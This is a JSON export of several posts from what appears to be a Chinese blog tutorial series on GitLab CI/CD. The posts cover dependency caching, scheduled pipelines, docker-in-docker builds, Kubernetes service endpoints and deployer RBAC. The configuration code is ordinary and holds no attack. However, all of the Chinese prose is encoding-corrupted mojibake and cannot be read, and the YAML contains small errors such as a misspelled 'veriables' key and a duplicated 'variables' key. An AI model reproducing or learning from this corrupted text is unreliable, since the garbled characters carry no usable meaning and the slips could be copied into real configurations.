pymicroï¼Œå†…éƒ¨ä¸åŒ…å«ä»»ä½•ä¾èµ–ï¼Œéœ€è¦åœ¨è¿è¡Œæµ‹è¯•ä¹‹å‰ä»å¤´å¼€å§‹å®‰è£…ï¼Œä¸ºæ­¤ä¼šè€—è´¹å¤§é‡æ—¶é—´ã€‚äºæ˜¯ï¼Œæˆ‘å°±æƒ³æŠŠè¿™äº›ä¾èµ–æ–‡ä»¶ç¼“å­˜èµ·æ¥ã€‚äºæ˜¯æ‰¾åˆ°äº†è¿™ä¸ªæ–‡æ¡£ï¼Œåœ¨æµ‹è¯•ä»»åŠ¡è¿è¡Œæ—¶ï¼Œä½¿ç”¨ virtualenv å°†æ‰€æœ‰ä¾èµ–æ”¾è¿›é¡¹ç›®ç›®å½•ä¸‹ï¼Œå¹¶é…ç½®ç¼“å­˜ï¼Œè¿™æ ·åœ¨ä»»åŠ¡è¿è¡ŒæˆåŠŸåï¼ŒCI ç³»ç»Ÿä¼šå°†ä¾èµ–ç¼“å­˜èµ·æ¥ï¼Œä¿å­˜åœ¨ Runner ä¸­ï¼Œä¸‹æ¬¡è¿è¡Œæ—¶å°±ä¸éœ€è¦é‡æ–°å®‰è£…ä¾èµ–äº†ã€‚ç»å®æµ‹ï¼ŒåŠ ä¸Šä¾èµ–ç¼“å­˜å¯ä»¥ä½¿æˆ‘ä»¬çš„æµ‹è¯•ä»»åŠ¡è¿è¡Œæ—¶é—´ä»ä¸¤åˆ†åŠç¼©çŸ­åˆ°ä¸€åˆ†åŠã€‚äºæ˜¯å¾ˆå¼€å¿ƒåœ°çœä¸‹äº†æ— æ•°ä¸ª 1s ä¸€åˆ†é’Ÿã€‚é…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼š123456789101112131415161718test_all: image: \"/pymicro\" stage: test_all variables: GIT_STRATEGY: fetch PIP_CACHE_DIR: \"$CI_PROJECT_DIR/.cache\" before_script: - \"[ -e venv ] || ( pip install virtualenv -i https://mirrors.aliyun.com/pypi/simple &amp;&amp; virtualenv venv )\" - source venv/bin/activate - pip install -U -r test_requirements.txt -i https://mirrors.aliyun.com/pypi/simple script: - flake8 app - pytest tests cache: paths: - .cache/ - venv/ key: requirement-cacheéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œcache åªèƒ½ç¼“å­˜é¡¹ç›®ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œä¸èƒ½ç¼“å­˜å…¶å®ƒç›®å½•çš„æ–‡ä»¶ï¼Œæ¯”å¦‚ /opt/ ä»€ä¹ˆçš„ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¿…é¡»ç”¨ virtualenv æˆ–è€… pipenv å°†æ‰€æœ‰ site-packages å­˜åœ¨é¡¹ç›®ç›®å½•ä¸‹ã€‚å†å°± before_script é‡Œé¢çš„ç¬¬ä¸€å¥å’Œç¬¬ä¸‰å¥å¤šè¯´ä¸¤å¥ï¼šä¸€å¼€å§‹æ˜¯ç…§ç€æ–‡æ¡£æ¥å†™çš„ï¼Œä½†æ˜¯é‚£æ ·çš„è¯æ¯æ¬¡éƒ½è¦é‡æ–°å®‰è£… virtualenvï¼Œå¹¶ä¸”è¿˜è¦é‡å¤åˆ›å»ºè™šæ‹Ÿç¯å¢ƒã€‚è¿™ä¹Ÿæ˜¯å®‰è£…ä¾èµ–å•Šâ€¦å¹¶ä¸”å°±ç®—æ˜¯ç”¨ PIP_CACHE_DIR æŠŠä¾èµ–åŒ…ç¼“å­˜åœ¨æœ¬åœ°ï¼Œåˆ›å»º virtualenv æ˜¯ä¹Ÿè¦å®‰è£… setuppools å’Œ pip ç­‰ï¼Œä¾ç„¶å¾ˆæ…¢ ğŸŒš äºæ˜¯å¹²è„†åŠ äº†ä¸ªåˆ¤æ–­ï¼Œå¦‚æœæœ‰ venv è¿™ä¸ªç›®å½•ï¼Œå°±ç›´æ¥è·³è¿‡åˆ›å»ºè™šæ‹Ÿç¯å¢ƒçš„é˜¶æ®µã€‚æˆ‘ä»¬çš„ requirements.txt æ˜¯ä¸é”ä¾èµ–ç‰ˆæœ¬çš„ï¼Œæ‰€ä»¥ pip install -U -r å¯ä»¥åœ¨æ¯æ¬¡è¿è¡Œæ—¶å¯¹æœ¬åœ°ç¼“å­˜çš„ä¾èµ–è¿›è¡Œæ›´æ–°ï¼Œè¿™æ ·è™½ç„¶ç¼“å­˜äº†ä¾èµ–æ–‡ä»¶ï¼Œä½† pip ä¾ç„¶ä¼šå’Œ registry è¿›è¡Œç½‘ç»œäº¤äº’ã€‚å»æ‰ -U çš„è¯ï¼Œä¾èµ–å°±ä¸ä¼šè¢«æ›´æ–°ï¼Œä½†æ˜¯ pip install çš„æ‰§è¡Œæ—¶é—´ä¼šç›´æ¥é™ä½åˆ°ä¸€ä¸¤ç§’é’Ÿã€‚ 3. å®šæ—¶ä»»åŠ¡æ›´å‡†ç¡®çš„å«æ³•ï¼Œåº”è¯¥å«å®šæ—¶æµæ°´çº¿(Scheduling Pipelines)ã€‚åœ¨é¡¹ç›®çš„ CI/CD â†’ Pipeline èœå•ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é…ç½®å®šæ—¶ä»»åŠ¡ã€‚å®šæ—¶çš„é…ç½®æ–¹å¼ä¸ Crontab çš„é…ç½®æ–¹å¼ç›¸åŒï¼Œè¿˜å¯ä»¥é€‰æ‹©è¿™ä¸ªå®šæ—¶ pipeline æ‰€ä½¿ç”¨çš„æ—¶åŒºã€‚é…ç½®å¥½åå°±å¯ä»¥çœ‹åˆ°è®¾ç½®çš„å®šæ—¶ä»»åŠ¡ï¼Œåˆ°æ—¶é—´å°±ä¼šåœ¨æŸä¸ªåˆ†æ”¯ä¸Šè‡ªåŠ¨è§¦å‘ã€‚åˆ°ç°åœ¨ä¸ºæ­¢ï¼Œæˆ‘ä»¬å¹³æ—¶çš„ Pipeline å’Œå®šæ—¶ä»»åŠ¡ä¸­æ‰§è¡Œçš„ä»»åŠ¡æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ã€‚ä½†å¦‚æœæˆ‘ä»¬æœ‰ä¸€äº›ç‰¹æ®Šçš„ä»»åŠ¡éœ€è¦åªåœ¨å®šæ—¶ä»»åŠ¡ä¸­æ‰§è¡Œï¼Œå¯ä»¥åœ¨ job çš„ only å±æ€§ä¸­å†™å…¥ - schedulesï¼›åŒæ ·ï¼Œå¦‚æœæŸäº›ä»»åŠ¡ä¸åº”è¯¥åœ¨å®šæ—¶ä»»åŠ¡ä¸­æ‰§è¡Œï¼Œé…ç½®ä¸€ä¸‹ except å±æ€§å°±å¯ä»¥äº†ã€‚ 4. éƒ¨ç½²ç¯å¢ƒå¦‚æœé¡¹ç›®çš„ CD æµç¨‹åœ¨ GitLab ä¸­è¿›è¡Œçš„è¯ï¼Œå¯ä»¥è€ƒè™‘åœ¨ .gitlab-ci.yml ä¸­é…ç½®éƒ¨ç½²ä»»åŠ¡æ‰§è¡Œæ‰€åœ¨çš„ç¯å¢ƒï¼š12345678910111213deploy_rpc: stage: deploy_production only: - master except: - schedules tags: - deploy-production when: manual environment: name: production/rpc script: - kubectl set image deploy/project-rpc \"app=$&#123;IMAGE_TAG&#125;\"é…ç½®å®Œæˆåï¼Œåœ¨æ‰§è¡Œè¿™ä¸ªä»»åŠ¡æ—¶ï¼ŒGitLab å°±ä¼šä»é…ç½®ä¸­è¯»å–ç¯å¢ƒé…ç½®ï¼Œå¹¶è®°å½•å½“å‰ç¯å¢ƒéƒ¨ç½²æ—¶é¡¹ç›®æ‰€åœ¨çš„ Git commit. éšåï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨ CI/CD â†’ Environments èœå•ä¸­çœ‹åˆ°è¿™ä¸ªç¯å¢ƒçš„éƒ¨ç½²æƒ…å†µã€‚ç‚¹å‡»ç¯å¢ƒå³è¾¹çš„æ‰§è¡Œï¼ˆâ–¶ï¸ï¼‰æŒ‰é’®ï¼Œå¯ä»¥æ–¹ä¾¿åœ°å°†è¿™ä¸ª commit çš„ä»£ç éƒ¨ç½²åˆ°å…¶å®ƒç¯å¢ƒä¸­ï¼›ç‚¹å‡»ç¯å¢ƒåï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªç¯å¢ƒçš„éƒ¨ç½²å†å²ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œæ–¹ä¾¿åœ°å°†ç¯å¢ƒä¸­çš„ä»£ç å›æ»šåˆ°ä¹‹å‰çš„ç‰ˆæœ¬ã€‚GitLab è¿˜æä¾›äº†ä¸€ä¸ªè´´å¿ƒçš„åŠŸèƒ½ï¼šæˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨ Merge Request çš„é¡µé¢ä¸­çœ‹åˆ°å½“å‰ MR çš„éƒ¨ç½²è¿›åº¦ï¼Œä»¥åŠè¯¥ MR éƒ¨ç½²è‡³æ¯ä¸ªç¯å¢ƒçš„æ—¶é—´ç‚¹ã€‚","categories":[{"name":"DevOps","slug":"DevOps","permalink":"https://blog.stdioa.com/categories/DevOps/"}],"tags":[{"name":"DevOps","slug":"DevOps","permalink":"https://blog.stdioa.com/tags/DevOps/"},{"name":"GitLab","slug":"GitLab","permalink":"https://blog.stdioa.com/tags/GitLab/"},{"name":"CI/CD","slug":"CI-CD","permalink":"https://blog.stdioa.com/tags/CI-CD/"}]},{"title":"GitLab CI/CD åŸºç¡€æ•™ç¨‹ï¼ˆä¸‰ï¼‰","slug":"gitlab-cicd-usage","date":"2018-06-23T12:53:00.000Z","updated":"2018-07-12T11:35:13.424Z","comments":true,"path":"2018/06/gitlab-cicd-usage/","link":"","permalink":"https://blog.stdioa.com/2018/06/gitlab-cicd-usage/","excerpt":"å‰ä¸¤ç¯‡æˆ‘ä»¬è®²äº† GitLab CI/CD çš„ç®€å•åº”ç”¨åŠéƒ¨ç½²æ–¹å¼ï¼Œè¿™ä¸€ç¯‡ç®€å•è®²ä¸€ä¸‹å¦‚ä½•å°† GitLab CI/CD ä¸æ—¥å¸¸å¼€å‘éƒ¨ç½²æµç¨‹ç»“åˆã€‚","text":"å‰ä¸¤ç¯‡æˆ‘ä»¬è®²äº† GitLab CI/CD çš„ç®€å•åº”ç”¨åŠéƒ¨ç½²æ–¹å¼ï¼Œè¿™ä¸€ç¯‡ç®€å•è®²ä¸€ä¸‹å¦‚ä½•å°† GitLab CI/CD ä¸æ—¥å¸¸å¼€å‘éƒ¨ç½²æµç¨‹ç»“åˆã€‚ 0. TL;DRçœ‹æ–‡æ¡£ï¼Ÿå…¶å®å°±æ˜¯ç®€å•åº”ç”¨å§ã€‚.gitlab-ci.yml çš„å®Œæ•´é…ç½®å®šä¹‰å¯ä»¥è§ç¬¬ä¸€ç¯‡åšæ–‡ã€‚ 1. æµ‹è¯•é˜¶æ®µæµ‹è¯•é˜¶æ®µæ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œåªéœ€è¦æŠŠ runner tag æ‰“å¥½ï¼ˆæ³¨å†Œæ—¶ä½¿ç”¨ --tag-list å‚æ•°ï¼‰ï¼ŒåŸºäº docker/k8s æŠŠ Runner æ­èµ·æ¥ï¼ŒåŸºæœ¬ä¸Šå°±å¯ä»¥è‡ªåŠ¨è¿è¡Œäº†ã€‚.gitlab-ci.yml é…ç½®å¦‚ä¸‹ï¼š123456789101112131415test_all: image: \"pymicro\" stage: test services: - name: mysql:5.6 alias: mysql command: [\"mysqld\", \"--character-set-server=utf8mb4\", \"--collation-server=utf8mb4_unicode_ci\"] veriables: MYSQL_DATABASE: db MYSQL_ROOT_PASSWORD: password before_script: - pip install -U -r requirements.txt script: - flake8 app - pytest testsè¿™é‡Œå®šä¹‰çš„ä¸¤ä¸ªç¯å¢ƒå˜é‡éƒ½æ˜¯ç»™ MySQL æœåŠ¡ç”¨çš„ï¼Œmysql é•œåƒä¼šåœ¨å®¹å™¨å¯åŠ¨æ—¶è¯»å–æŸäº›ç¯å¢ƒå˜é‡ï¼Œæ¥é…ç½®æ•°æ®åº“ã€‚å…·ä½“æ”¯æŒçš„ç¯å¢ƒå˜é‡å¯ä»¥å‚è€ƒ MySQL çš„ docker image é¡µé¢ã€‚æˆ‘ä»¬å¯ä»¥åœ¨ service ä¸­è‡ªå®šä¹‰å¯åŠ¨å‘½ä»¤ï¼Œè¿™é‡Œæˆ‘å°† MySQL çš„é»˜è®¤å­—ç¬¦é›†è®¾ç½®æˆäº† utf8mb4ï¼Œå¦åˆ™æœåŠ¡å™¨ä¸­çš„æ•°æ®åº“å­—ç¬¦é›†ä¼šæ˜¯ latin1.éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼ŒåŸºäº Docker éƒ¨ç½²çš„ Runnerï¼Œå¯ä»¥ä½¿ç”¨æœåŠ¡åˆ«å, ä¹Ÿå°±æ˜¯åœ¨è·‘æµ‹è¯•çš„é˜¶æ®µä¸­ï¼Œå¯ä»¥é€šè¿‡ service alias è®¿é—®åˆ°å¯¹åº”çš„æœåŠ¡ï¼›è€ŒåŸºäº Kubernetes çš„ Runner ä¸æ”¯æŒï¼Œæ‰€ä»¥åªèƒ½é€šè¿‡ 127.0.0.1 è®¿é—®ã€‚ 2. æ„å»ºé˜¶æ®µæ„å»ºé˜¶æ®µä¸­ï¼Œæˆ‘ä»¬ä¼šç”¨ Docker å°†å·¥ç¨‹æ‰“åŒ…æˆé•œåƒï¼Œå¹¶æ¨é€åˆ°è¿œç«¯ registry. 2.1 åŸºæœ¬é…ç½®.gitlab-ci.yml é…ç½®å¦‚ä¸‹ï¼š123456789101112131415161718build_image: image: \"docker:17.11\" stage: build services: - name: \"docker:17.12.0-ce-dind\" alias: dockerd variables: DOCKER_HOST: tcp://127.0.0.1:2375 IMAGE: docker.registry/name/$&#123;CI_PROJECT_NAMESPACE&#125;-$&#123;CI_PROJECT_NAME&#125; before_script: - IMAGE_TAG=$&#123;IMAGE&#125;:$&#123;CI_COMMIT_SHA:0:8&#125; only: - master tags: - build script: - docker build -t $&#123;IMAGE_TAG&#125; -f Dockerfile . - docker push $&#123;IMAGE_TAG&#125;åœ¨è¿™ä¸ªä»»åŠ¡ä¸­ï¼Œæˆ‘ä»¬å¯ç”¨äº†ä¸€ä¸ª dind ä½œä¸º serviceï¼Œå¹¶ä½¿ç”¨ DOCKER_HOST ç¯å¢ƒå˜é‡æ¥è®© docker å‘½ä»¤ä¸æˆ‘ä»¬çš„ dind æœåŠ¡é€šä¿¡ã€‚ä»»åŠ¡æ‰§è¡Œæ—¶ï¼Œä¼šæ ¹æ®é¡¹ç›®ä¸­çš„ Dockerfile æ„å»ºå¹¶æ¨é€é•œåƒã€‚æˆ‘ä»¬çš„é•œåƒåç§°ä½¿ç”¨äº†é¡¹ç›®ç»„å + é¡¹ç›®åçš„é…ç½®ï¼Œtag ä½¿ç”¨ commit SHA å‰å…«ä½æ¥æ„æˆã€‚å› ä¸ºåœ¨ variable å­—æ®µä¸­å®šä¹‰ç¯å¢ƒå˜é‡æ—¶ï¼Œä¸èƒ½ä½¿ç”¨ ${CI_COMMIT_SHA:0:8} è¿™ç§ shell å­—ç¬¦ä¸²æ“ä½œï¼Œæ‰€ä»¥åªå¥½åœ¨ before_script ä¸­æ¥å®šä¹‰è¿™ä¸ªç¯å¢ƒå˜é‡ã€‚è¿™é‡Œï¼Œæˆ‘ä»¬éœ€è¦åœ¨ docker ç¯å¢ƒä¸­å¯åŠ¨ä¸€ä¸ª dindï¼Œæ¥ä½œä¸ºæ„å»ºæ—¶æ‰€ç”¨çš„æœåŠ¡å™¨ã€‚å€¼å¾—æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œå¦‚æœä½ éœ€è¦ä½¿ç”¨ dindï¼Œåˆ™ dind æ‰€åœ¨çš„ container åº”è¯¥å…·æœ‰ç‰¹æƒï¼ˆå®˜æ–¹æ–‡æ¡£ä¹Ÿæœ‰è®²åˆ°ï¼‰ã€‚æ‰€ä»¥åœ¨ Runner æ³¨å†Œæ—¶ï¼Œéœ€è¦åŠ ä¸Š --docker-privileged æˆ– --kubernetes-privileged å‚æ•°ï¼ˆå…·ä½“è§†æ‰§è¡Œå¹³å°è€Œå®šï¼‰ï¼Œæ¥ä½¿ job è¿è¡Œæ—¶æ‰€åœ¨çš„ container æ‹¥æœ‰ç‰¹æƒã€‚ä¸è¿‡ï¼Œåœ¨éƒ¨ç½² runner æ—¶ï¼ŒRunner daemon æ‰€éœ€çš„ container å¹¶ä¸éœ€è¦è¿™ä¸ªç‰¹æƒï¼ˆå…¶å®å¯ä»¥æœºå™¨ä¸Šçš„ docker service æˆ–è€…æ“æ§ pod å·²ç»æ˜¯ä¸€ç§ç‰¹æƒäº†ğŸ˜‚ï¼‰ã€‚ 2.2 dind æœåŠ¡è°ƒï¼ˆluanï¼‰ä¼˜ï¼ˆgaoï¼‰ 2.2.1 dind æˆä¸ºç‹¬ç«‹æœåŠ¡ä¸Šé¢å®šä¹‰çš„ job ä¸­ï¼Œdind æ˜¯ä¸€ä¸ª job serviceï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ¯æ¬¡æ„å»ºçš„æ—¶å€™éƒ½ä¼šä»å¤´å¼€å§‹æ„å»ºã€‚è€Œ docker æ„å»ºæä¾›äº†ä¸€å¥—æ¯”è¾ƒå®Œå–„çš„ç¼“å­˜åŠŸèƒ½ï¼Œå¦‚æœ Dockerfile æŸå‡ å±‚çš„æ„å»ºå‘½ä»¤å®Œå…¨ä¸€æ ·ï¼ˆæ¯”å¦‚åªæ˜¯ RUN apt-get install xxxï¼‰çš„è¯ï¼ŒDocker ä¼šåœ¨å†æ¬¡æ„å»ºæ—¶è‡ªåŠ¨ä½¿ç”¨ä¹‹å‰å·²ç»æ„å»ºå¥½çš„å±‚ï¼Œè¿™æ ·å¯ä»¥å‡å°‘æ„å»ºæ—¶é—´ã€‚æ‰€ä»¥æˆ‘åœ¨åšå®Œä¸Šé¢çš„é‚£ä¸ªæµç¨‹ä¹‹åç«‹åˆ»æ„è¯†åˆ°äº†è¿™ä¸€ç‚¹ï¼Œäºæ˜¯å•ç‹¬æŠŠ dind ä» CI ä»»åŠ¡ä¸­æŠ½ç¦»äº†å‡ºæ¥ï¼Œåœ¨ k8s namespace ä¸­å•ç‹¬æ­å»ºäº†ä¸€ä¸ª dind æœåŠ¡ï¼Œå¹¶å®šä¹‰äº† k8s serviceï¼Œè€Œ job ä¸­çš„ DOCKER_HOST ç¯å¢ƒå˜é‡ä¹Ÿæ”¹æˆäº† tcp://dockerd:2375ï¼Œå› ä¸º dind å¹¶ä¸åœ¨ job pod é‡Œäº†ï¼Œè€Œæ˜¯ä¸€ä¸ª k8s serviceï¼Œéœ€è¦é€šè¿‡ DNS æ¥è·å–åˆ°å…·ä½“çš„ IP.è¿™æ ·ä¸€æ¥ï¼Œåœ¨ job ç»“æŸåï¼Œdind ä¾ç„¶å­˜åœ¨ï¼Œå¹¶ä¼šä¿ç•™å‰ä¸€æ¬¡çš„æ„å»ºå±‚ï¼Œè¿™æ ·ä¸‹æ¬¡æ„å»ºçš„æ—¶å€™å°±å¯ä»¥è·³è¿‡ä¾èµ–å®‰è£…æ­¥éª¤ï¼Œå¤§å¤§ç¼©çŸ­äº†æ„å»ºæ‰€éœ€çš„æ—¶é—´ã€‚åœ¨ k8s ä¸­æ­å»º dind æœåŠ¡çš„å†…å®¹ä¸åœ¨æœ¬åšæ–‡è®²è¿°èŒƒå›´å†…ï¼Œæƒ³æ­å»ºçš„è¯ï¼Œå¯ä»¥å» Google ä¸€ä¸‹ã€‚ 2.2.2 å°¼ç›â€¦ Node å­˜å‚¨ç©ºé—´æ»¡äº†ï¼Ÿåœ¨æˆ‘ä»¬çš„ dind æœåŠ¡è¿è¡Œèµ·æ¥ä¸€æ®µæ—¶é—´åï¼Œå°±é‡åˆ°äº†ä¸€ä¸ªå°´å°¬çš„é—®é¢˜ï¼šdind æœåŠ¡å ç”¨äº†å¤ªå¤šå­˜å‚¨ç©ºé—´ï¼Œå¯¼è‡´ pod çš„æ‰€åœ¨ node å‡ºç°äº†é—®é¢˜â€¦è¿™ä¸ªé—®é¢˜æœ‰ä¸¤ç§è§£å†³æ–¹æ¡ˆï¼šä¸€æ˜¯å•ç‹¬åšä¸€ä¸ª nodeï¼Œå¹¶ç”¨ node selector å°† dind å•ç‹¬æ”¾åœ¨é‚£ä¸ª node ä¸Šï¼Œä»¥é¿å…å½±å“å…¶å®ƒæœåŠ¡ï¼›äºŒæ˜¯ä¸º dind å•ç‹¬æŒ‚ä¸€ä¸ª volumeï¼Œä½¿ç”¨ PersistentVolume è¿›è¡ŒæŒä¹…åŒ–å­˜å‚¨ã€‚è€Œæˆ‘å¸çš„è§£å†³æ–¹æ¡ˆç®€ç›´æ˜¯éªšæ–­è…¿ï¼šå•ç‹¬ä¹°ä¸€å° VPSï¼Œåœ¨ä¸Šé¢æ­ä¸€ä¸ª docker æœåŠ¡å™¨ï¼Œç„¶åæŠŠè¿™ä¸ªæœåŠ¡å¼•å…¥ k8s é›†ç¾¤ä¸­ ğŸ˜‚æ‰€ä»¥ï¼Œåœ¨æ­å»ºå¥½æœåŠ¡å™¨ä¹‹åï¼Œä¿®æ”¹ k8s ä¸­çš„ Serviceï¼Œä¸º Service æ·»åŠ  Endpointï¼Œæ³¨æ„ç«¯ç‚¹åç§°è¦ä¸æœåŠ¡åç§°ä¸€è‡´ï¼š123456789101112131415161718192021222324252627kind: Servicemetadata: name: dockerd namespace: cicd labels: app: dockerdspec: ports: - protocol: TCP port: 2375 targetPort: 2375 clusterIP: None---kind: EndpointsapiVersion: v1metadata: name: dockerd namespace: cicd labels: app: dockerdsubsets: - addresses: - ip: 192.168.8.45 ports: - port: 2375è¿™æ ·æˆ‘ä»¬åœ¨é›†ç¾¤ä¸­æŸ¥çœ‹ dockerd çš„ IP åœ°å€æ—¶ï¼Œå°±ä¼šå¾—åˆ°é‚£å° VPS çš„ IP äº†ã€‚ç„¶åâ€¦è®°å¾—å†™ä¸ª cron jobï¼Œå®šæœŸæ¸…ç† docker æœåŠ¡å™¨ä¸Šçš„ç¼“å­˜ï¼Œå¦åˆ™ç¡¬ç›˜ä¹Ÿæ˜¯ä¼šæ»¡çš„_(:Ğ·ã€âˆ )_ã€‚ 3. éƒ¨ç½²é˜¶æ®µéƒ¨ç½²é˜¶æ®µä¸­ï¼Œæˆ‘ä»¬ä¼šä½¿ç”¨ kubectl set image å‘½ä»¤ï¼Œå¯¹ç‰¹å®š Deployment è§¦å‘ä¸€æ¬¡æ»šåŠ¨æ›´æ–°ã€‚.gitlab-ci.yml é…ç½®ï¼š12345678910111213141516deploy_production: image: \"kubectl:1.8.1\" stage: deploy variables: GIT_STRATEGY: none variables: IMAGE: docker.registry/name/$&#123;CI_PROJECT_NAMESPACE&#125;-$&#123;CI_PROJECT_NAME&#125; before_script: - IMAGE_TAG=$&#123;IMAGE&#125;:$&#123;CI_COMMIT_SHA:0:8&#125; only: - master when: manual tags: - deploy-production script: - kubectl set image deploy/myproject \"app=$&#123;IMAGE_TAG&#125;\" --recordè¿™é‡Œæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ª GIT_STRATEGY ç¯å¢ƒå˜é‡ï¼Œæœ‰äº†è¿™ä¸ªå˜é‡ï¼Œåœ¨ CD ä»»åŠ¡æ‰§è¡Œæ—¶ï¼ŒRunner ä¼šè·³è¿‡å…‹éš†ä»£ç çš„æ­¥éª¤ï¼Œå› ä¸ºåœ¨è¿™ä¸ªé˜¶æ®µä¸­æˆ‘ä»¬å¹¶ä¸éœ€è¦é¡¹ç›®ä»£ç ã€‚è€Œ when: manual å±æ€§è¡¨ç¤ºè¿™ä¸ªä»»åŠ¡éœ€è¦æ‰‹åŠ¨è§¦å‘ã€‚è¿™ä¸ªé˜¶æ®µä¸­ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ª ServiceAccount æ¥è®© pod ä½¿ç”¨ kubectl ä¸é›†ç¾¤é€šä¿¡ï¼›åŒæ—¶ä¸ºäº†ä¿è¯ set image å‘½ä»¤çš„æˆåŠŸæ‰§è¡Œï¼Œæˆ‘ä»¬è¿˜éœ€è¦ä¸ºè¿™ä¸ªè´¦æˆ·èµ‹äºˆä¸€äº›æƒé™ã€‚12345678910111213141516171819202122232425262728293031apiVersion: v1kind: ServiceAccountmetadata: name: deployer namespace: cicdimagePullSecrets:- name: dockersecret---apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRolemetadata: name: deployerrules: - apiGroups: [\"extensions\"] resources: [\"deployments\"] verbs: [\"get\", \"patch\"]---apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRoleBindingmetadata: name: cicd-deployersubjects:- kind: ServiceAccount name: deployer namespace: cicdroleRef: kind: ClusterRole name: deployer apiGroup: rbac.authorization.k8s.ioåŒæ—¶ï¼Œåœ¨æˆ‘ä»¬æ³¨å†Œè¿™ä¸ª runner æ—¶ï¼Œéœ€è¦åŠ ä¸Š --kubernetes-service-account deployer å‚æ•°ï¼Œè¿™æ ·åœ¨ job pod å¯åŠ¨æ—¶ï¼Œé›†ç¾¤å°† deployer è´¦æˆ·çš„å‡­æ®æ³¨å…¥è¿› podï¼Œkubectl å‘½ä»¤æ‰èƒ½æ­£å¸¸ä½¿ç”¨ã€‚è‡³æ­¤ï¼Œæˆ‘ä»¬ï¼ˆåº”è¯¥ï¼‰å¯ä»¥å®ç°å¹¶éƒ¨ç½²ä¸€å¥—å®Œæ•´çš„æµ‹è¯•â†’æ„å»ºâ†’éƒ¨ç½²æµç¨‹ã€‚è¿™ä¸ªç³»åˆ—åˆ°æ­¤ä¹Ÿå°±ç»“æŸäº†ï¼Œåé¢è¿˜ä¼šæœ‰ä¸€ç¯‡ï¼Œè®²ç‚¹å‘¨è¾¹çš„å°å·¥ï¼ˆç©ï¼‰å…·ã€‚","categories":[{"name":"DevOps","slug":"DevOps","permalink":"https://blog.stdioa.com/categories/DevOps/"}],"tags":[{"name":"DevOps","slug":"DevOps","permalink":"https://blog.stdioa.com/tags/DevOps/"},{"name":"GitLab","slug":"GitLab","permalink":"https://blog.stdioa.com/tags/GitLab/"},{"name":"CI/CD","slug":"CI-CD","permalink":"https://blog.stdioa.com/tags/CI-CD/"}]},{"title":"GitLab CI/CD åŸºç¡€æ•™ç¨‹ï¼ˆäºŒï¼‰","slug":"gitlab-cicd-deploy","date":"2018-06-18T07:46:00.000Z","updated":"2018-10-08T13:06:22.539Z","comments":true,"path":"2018/06/gitlab-cicd-deploy/","link":"","permalink":"https://blog.stdioa.com/2018/06/gitlab-cicd-deploy/","excerpt":"æœ¬æ–‡æ˜¯ GitLab CI/CD ç³»åˆ—çš„ç¬¬äºŒç¯‡ï¼Œä¸»è¦ä»‹ç» GitLab CI Runner åœ¨ Docker å’Œ Kubernetes ç¯å¢ƒä¸‹çš„éƒ¨ç½²æ–¹å¼ã€‚","text":"æœ¬æ–‡æ˜¯ GitLab CI/CD ç³»åˆ—çš„ç¬¬äºŒç¯‡ï¼Œä¸»è¦ä»‹ç» GitLab CI Runner åœ¨ Docker å’Œ Kubernetes ç¯å¢ƒä¸‹çš„éƒ¨ç½²æ–¹å¼ã€‚ 0. TL;DRæ–‡æ¡£åœ¨è¿™å„¿ã€‚Changelog:2018-10-08 21:05 è¡¥ä¸Šç¼ºå¤±çš„ k8s Secret å®šä¹‰æ–‡ä»¶ã€‚ 1. GitLab Runner çš„è¿è¡Œç¯å¢ƒåŠæ‰§è¡Œç¯å¢ƒé€‰æ‹©GitLab Runner ç”¨ Go è¯­è¨€å†™æˆï¼Œæœ€åæ‰“åŒ…æˆå•æ–‡ä»¶è¿›è¡Œåˆ†å‘ï¼Œæ‰€ä»¥å¯ä»¥åœ¨å¾ˆå¤šå¹³å°ä¸‹å¿«é€Ÿè¿è¡Œï¼ŒåŒ…æ‹¬ Windows / GNU Linux / MacOS ç­‰ï¼ŒåŒæ—¶ä¹Ÿæä¾› Docker é•œåƒï¼Œæ–¹ä¾¿åœ¨ Docker / Kubernetes ç¯å¢ƒä¸­éƒ¨ç½²ã€‚ä½†é™¤äº† Runner è¿è¡Œå¤–ï¼ŒRunner è¿˜éœ€è¦ä¸€ä¸ªç¯å¢ƒæ¥è¿è¡Œ jobs. è¿™ä¸ªç¯å¢ƒç§°ä¹‹ä¸ºæ‰§è¡Œç¯å¢ƒï¼ˆexecutorï¼‰ã€‚GitLab Runner æ”¯æŒå¤šç§æ‰§è¡Œç¯å¢ƒï¼ŒåŒ…æ‹¬ SSHï¼ŒDockerï¼ŒVirtualBox ç­‰ã€‚ä¸åŒæ‰§è¡Œç¯å¢ƒå¯¹ GitLab CI/CD ä¸åŒåŠŸèƒ½çš„æ”¯æŒæƒ…å†µï¼Œå¯ä»¥çœ‹å®˜æ–¹æ–‡æ¡£ä¸­çš„å…¼å®¹æ€§è¡¨æ ¼ã€‚ç”±äºæˆ‘å¸ä¸»è¦ç”¨ Docker æˆ– Kubernetes æ¥æ‰˜ç®¡æœåŠ¡ï¼Œå¹¶ä¸”åœ¨è¿›è¡Œæµ‹è¯•æ—¶éœ€è¦ service çš„æ”¯æŒï¼Œæ‰€ä»¥è‡ªç„¶åªå‰©ä¸‹äº†ä¸¤ç§é€‰æ‹©ï¼ŒDocker å’Œ Kubernetes. åœ¨ä¸‹æ–‡ä¸­ä¼šè®²è§£ GitLab åœ¨ Docker å’Œ Kubernetes 